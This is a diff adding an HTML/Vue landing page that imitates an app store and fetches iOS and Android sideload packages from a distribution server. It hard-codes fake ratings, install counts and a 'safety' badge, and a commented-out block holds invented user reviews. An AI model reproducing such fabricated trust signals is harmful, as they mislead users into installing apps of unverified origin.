@@ -1,0 +1,436 @@
+<!doctype html>
+<html>
+
+<head design-width="750">
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<meta name="format-detection" content="telephone=no">
+	<title></title>
+	<link rel="stylesheet" href="css/reset.css">
+	<!--重置样式-->
+	<link rel="stylesheet" href="css/style.css?v=202012">
+	<!--页面样式-->
+	<link rel="stylesheet" href="css/swiper.min.css">
+	<script src="js/auto-size.js"></script>
+	<!--设置字体大小-->
+	<script src="js/jquery.datetimepicker.fulls.js"></script>
+	<script src="js/jquery-1.10.2.min.js"></script>
+	<script type="text/javascript" src="js/jquery.qrcode.min.js"></script>
+
+	<script src="https://cdn.bootcdn.net/ajax/libs/vue/2.6.14/vue.js"></script>
+
+</head>
+
+<body ontouchstart="" onmouseover="" style="background:#00349a;">
+	<div id="w"
+		style="width:100%; height:100%; position:fixed; z-index:-1; background:url(img/bj.jpg) no-repeat center top;">
+	</div>
+	<div class="mobile-wrap center" id="app"
+		style="position:absolute; top:80px; left:0; right:0; margin:0 auto; max-width:750px; background:#FFFFFF; border-radius:30px 30px 0 0; width:96%; overflow:hidden;">
+		<main >
+			<div class="appItem" v-if="languages" >
+				<!-- logo -->
+				<div class="left"><img :src="downloadData.icon" id="icon" alt=""></div>
+				<div class="right">
+					<!-- 软件名 -->
+					<div style="display: flex;">
+						<strong id="name">{{downloadData.appName}}</strong>
+						<div align="right"><a @click="tishi(1)" href="javascript:;"><img
+									style="width:17px; height:17px; vertical-align:middle;"
+									src="img/renzhen.png">&nbsp;{{languages.safety}}</a></div>
+					</div>
+					<div class="installBox">
+						<a class="down" @click="onDownload" href="javascript:;">{{languages.download_name}}</a>
+					</div>
+				</div>
+
+				<!-- <div align="center" style="width:100%; margin-top:20px;">
+					<div id="pc" style="display:none;">
+						<div id="output"></div>
+						<p style="line-height:60px; color:#333333">请使用浏览器或相机扫码下载</p>
+
+					</div>
+				</div> -->
+
+				<div class="appTip">
+					<div class="score">
+						<div class="star">4.9 ★★★★★<var></var></div>
+						<p>19k {{languages.score}}</p>
+					</div>
+					<div class="centerBox">
+						<b>42w+</b>
+						<p>{{languages.install}}</p>
+					</div>
+					<div class="age">
+						<b>4+</b>
+						<p>{{languages.age}}</p>
+					</div>
+				</div>
+			</div>
+
+			<div class="comment" v-if="languages">
+				<strong class="publicTitle">{{languages.comment}}</strong>
+				<div class="left">
+					<b>5.0</b>
+					<p>{{languages.score_1}} 5 {{languages.score_2}}</p>
+				</div>
+				<div class="right">
+					<div class="star_row">
+						<span class="s1"><i></i></span>
+						<div class="lineBox"><var class="v1"></var></div>
+					</div>
+					<div class="star_row">
+						<span class="s2"><i></i></span>
+						<div class="lineBox"><var class="v2"></var></div>
+					</div>
+					<div class="star_row">
+						<span class="s3"><i></i></span>
+						<div class="lineBox"><var class="v3"></var></div>
+					</div>
+					<div class="star_row">
+						<span class="s4"><i></i></span>
+						<div class="lineBox"><var class="v4"></var></div>
+					</div>
+					<div class="star_row">
+						<span class="s5"><i></i></span>
+						<div class="lineBox"><var class="v5"></var></div>
+					</div>
+					<p>19k {{languages.score}}</p>
+				</div>
+			</div>
+
+			<!--<div class="appInfo">
+			<div class="box">
+				<ul>
+
+					<li>
+					   <span>顺其**然</span><br>
+						<p style="text-align:left">非常好的平台。</p>
+					</li>
+					<li>
+					   <span>A蓝红*</span><br>
+						<p style="text-align:left">我是朋友推荐的，一直坚持打卡！</p>
+					</li>
+					<li>
+					   <span>小镇姑*</span><br>
+						<p style="text-align:left">这个软件真不错，我用了2年了，强烈推荐</p>
+					</li>
+					<li>
+					   <span>陈静*</span><br>
+						<p style="text-align:left">用起来真不多，各方面都好用</p>
+					</li>
+                    <li>
+                       <span>温柔的台*</span><br>
+                        <p style="text-align:left">朋友推荐下载的</p>
+                    </li>
+
+
+					 <div align="center" style="margin:8px 0;"><a style="color:#999999" class="down" href="javascript:;">更多评论</a></div>
+
+				</ul>
+			</div>
+			</div>-->
+
+			<div class="appInfo" v-if="languages">
+				<strong class="publicTitle">{{languages.information}}</strong>
+				<div class="box">
+					<ul>
+						<li>
+							<span>{{languages.size}}</span>
+							<p>7.5 MB</p>
+						</li>
+						<li>
+							<span>{{languages.language}}</span>
+							<p id="language">{{languages.languageMsg}}</p>
+						</li>
+						<li>
+							<span>{{languages.size_part}}</span>
+							<p>{{languages.size_part_text}}</p>
+						</li>
+						<li>
+							<span>Copyright</span>
+							<p>© 2020 MobiFun Games Inc</p>
+						</li>
+					</ul>
+				</div>
+			</div>
+		</main>
+		<div class="footer" v-if="languages">
+			<p>{{languages.copyright_title}}：</p>
+			<p class="p2" style="font-size:10px">{{languages.copyright_text}}</p>
+		</div>
+
+
+		<div id="kai" v-if="kaishow"  style="position:absolute; top:10px; left:5%; width:90%; background:#FFFFFF;">
+			<div align="right" @click="tishi(0)"
+				style="width:100%; height:20px; color:#333333; font-size:14px; font-weight:600;">{{languages.close}}</div>
+			<div class="pic">
+				<img style="width:100%; height:auto;" v-if="downloadData.language == 'zh'" src="img/0df0c_0_600_411.jpg" alt="">
+				<img style="width:100%; height:auto;" v-if="downloadData.language == 'en'" src="img/en-1.png" alt="">
+				<img style="width:100%; height:auto;" v-if="downloadData.language == 'zh-tw'" src="img/zhtw-1.png" alt="">
+			</div>
+			<div style="padding:10px; font-size:14px; font-weight:600;">{{languages.tips_1}}</div>
+
+			<div class="pic">
+				<img style="width:100%; height:auto;" v-if="downloadData.language == 'zh'" src="img/0df0c_0_600_411.jpg" alt="">
+				<img style="width:100%; height:auto;" v-if="downloadData.language == 'en'" src="img/en-1.png" alt="">
+				<img style="width:100%; height:auto;" v-if="downloadData.language == 'zh-tw'" src="img/zhtw-1.png" alt="">
+			</div>
+			<div style="padding:10px; font-size:14px; font-weight:600;">{{languages.tips_2}}</div>
+
+			<div class="pic">
+				<img style="width:100%; height:auto;" v-if="downloadData.language == 'zh'" src="img/9179e_3_600_411.jpg" alt="">
+				<img style="width:100%; height:auto;" v-if="downloadData.language == 'en'" src="img/en-2.png" alt="">
+				<img style="width:100%; height:auto;" v-if="downloadData.language == 'zh-tw'" src="img/zhtw-2.png" alt="">
+			</div>
+			<div style="padding:10px; font-size:14px; font-weight:600;">{{languages.tips_3}}</div>
+
+			<div style="padding:20px 10px; font-size:14px; font-weight:600;">{{languages.tips_4}}</div>
+		</div>
+
+
+
+		<div class="pupPic"><img src="img/5cbc4_5_1242_2007.png" alt=""></div>
+		<div style="width:100%; height:60px; clear:both"></div>
+	</div>
+	<!--mobile_wrap-->
+
+	<div id="fz" align="center"
+		style="position:fixed; bottom:0; height:60px; border-top:#CCCCCC 1px solid; background:#FFFFFF; width:100%; display:none;">
+		<div>
+			<script type="text/javascript">
+				function copyUrl2() {
+					var Url2 = window.location.href;
+					var oInput = document.createElement('input');
+					oInput.value = Url2;
+					document.body.appendChild(oInput);
+					oInput.select(); // 选择对象
+					document.execCommand("Copy"); // 执行浏览器复制命令
+					oInput.className = 'oInput';
+					oInput.style.display = 'none';
+					alert('复制成功');
+				}
+			</script>
+		</div>
+	</div>
+
+	<script src="js/swiper-4.2.0.min.js"></script>
+	<script src="./language/index1.js"></script>
+	<!--轮播库-->
+	<script>
+		$("body").css("cursor", "pointer");
+
+		var ua = navigator.userAgent.toLowerCase();
+		var Sys = {};
+		var s;
+		(s = ua.match(/version\/([\d.]+).*safari/)) ? Sys.safari = s[1]: 0;
+
+		new Vue({
+			el:"#app",
+			data() {
+				return {
+					languages: null,
+					downloadData: null,
+					kaishow:false
+				}
+			},
+			methods: {
+
+				onDownload() {
+
+
+
+					var iosplace = 'appstore-hongtao-2',
+							androidplace = 'android-hongtao-1',
+							iosplacecode = 'appstore-hongtao-999',
+							androidplacecode = 'android-hongtao-4';
+
+					var ua = navigator.userAgent.toLowerCase(),
+							iphoneos = (ua.match(/iphone os/i) == "iphone os") || (ua.match(/iph os/i) == "iph os") || (ua.match(/ipad/i) == "ipad"),
+							android = (ua.match(/android/i) == "android") || (ua.match(/adr/i) == "adr") || (ua.match(/android/i) == "mi pad");
+
+					var s = 'https:' == document.location.protocol ? true : false;
+					var pid = iphoneos ? iosplace : androidplace;
+
+					var that = this
+					console.log(this.downloadData)
+					if (iphoneos) {
+						$.ajax({
+							url:  that.downloadData.ipa,
+							type: 'GET',
+						}).success(function (res) {
+
+							console.log("获取状态成功")
+							if(res.code === 0){
+
+								window.location.href = res.ipa
+							}else {
+								alert(res.message)
+							}
+
+						}).error(function (err){
+							console.log("获取状态失败")
+							//alert(err.status)
+						})
+
+					} else {
+
+
+						if(that.downloadData.apk === 'no'){
+							alert("暂无安卓版本")
+						}else {
+							$.ajax({
+								url:   that.downloadData.apk,
+								type: 'GET',
+							}).success(function (res) {
+								console.log("获取状态成功")
+
+								if(res.code === 0){
+									window.location.href = res.apk
+								}else {
+									alert(res.message)
+								}
+
+							}).error(function (err){
+								console.log("获取状态失败")
+								//alert(err.status)
+							})
+							//window.location.href = andurl;
+						}
+
+					}
+				},
+				tishi(s) {
+					console.log(s)
+					this.kaishow = s > 0 ? true : false
+
+				}
+			},
+			created() {
+				var urlParams = location.search.split('id=').pop()
+				const that = this
+				const URL = location.origin
+
+			$.ajax({
+				url: URL  + '/softwareDistribute/down/v1/' + urlParams,
+				type: 'GET',
+			}).done(function (res) {
+				if(res.code != 0) return alert('ERROR 404')
+				that.languages = language[res.data.language]
+
+				that.downloadData = res.data
+				that.pro = res.pro
+				document.title = res.data.appName
+
+				jQuery('#output').qrcode(res.data.url);
+				// $(".down").attr("href", res.data.ipa);
+				// $(".down").click(function (event) {
+				// 	console.log('1')
+				// 	setTimeout(function () {
+				// 		if (confirm) {
+				// 			console.log('2')
+				// 			location.href = res.pro;language
+				// 		}
+				// 	}, 4500)
+				// });
+
+				//判断设备是否为iPhone
+				if (/(iPhone|iPad|iPod|iOS)/i.test(ua)) {
+					if (Sys.safari) {
+						$(".down").attr("href", res.data.ipa);
+						$(".down").click(function (event) {
+							setTimeout(function () {
+								if (confirm) {
+									location.href = res.pro;
+								}
+							}, 4500)
+						});
+						//打开引导弹窗
+						$(".doubt").click(function (event) {
+							$(".pup").fadeIn();
+							var swiper = new Swiper('.swiper-container', {
+								loop: true,
+								pagination: {
+									el: '.swiper-pagination',
+								},
+							});
+						});
+					} else {
+						$(".pupPic").show();
+					}
+				}
+				//判断是否QQ内置浏览器
+				else if (ua.indexOf(' qq') > -1 && ua.indexOf('mqqbrowser') < 0) {
+					document.getElementById('fz').style.display = 'block';
+					$(".down").attr("href", '###');
+					$(".pupPic").show();
+				}
+				//判断Android
+				else if (/(Android)/i.test(ua)) {
+					$(".down").attr("href", res.data.apk);
+					//打开引导弹窗
+					$(".doubt").click(function (event) {
+						$(".pup").fadeIn();
+						var swiper = new Swiper('.swiper-container', {
+							loop: true,
+							pagination: {
+								el: '.swiper-pagination',
+							},
+						});
+					});
+				}
+				//在微信中打开
+				if (ua.match(/MicroMessenger/i) == "micromessenger") {
+					document.getElementById('fz').style.display = 'block';
+					$(".down").attr("href", '###');
+					$(".pupPic").show();
+				}
+
+			})
+			},
+
+		})
+
+
+		// function tishi(s) {
+		// 	if (s > 0) {
+		// 		// document.getElementById('kai').style.display = 'block';
+		// 		$('#kai').css('display','block')
+		// 	} else {
+		// 		// document.getElementById('kai').style.display = 'none';
+		// 		$('#kai').css('display','none')
+		// 	}
+		// }
+		if (!/windows phone|iphone|android/ig.test(window.navigator.userAgent)) {
+			document.getElementById('pc').style.display = 'block';
+		} else {
+			document.getElementById('m').style.display = 'block';
+		}
+
+
+
+
+
+
+
+		//关闭弹窗
+		$(".colse").click(function (event) {
+			$(".pup").fadeOut();
+		});
+
+		var s = document.body.clientWidth;
+		if (s < 500) {
+			document.getElementById("w").style.backgroundSize = "1500px auto";
+		}
+
+
+
+		// translate()
+	</script>
+
+
+</body>
+
+</html>
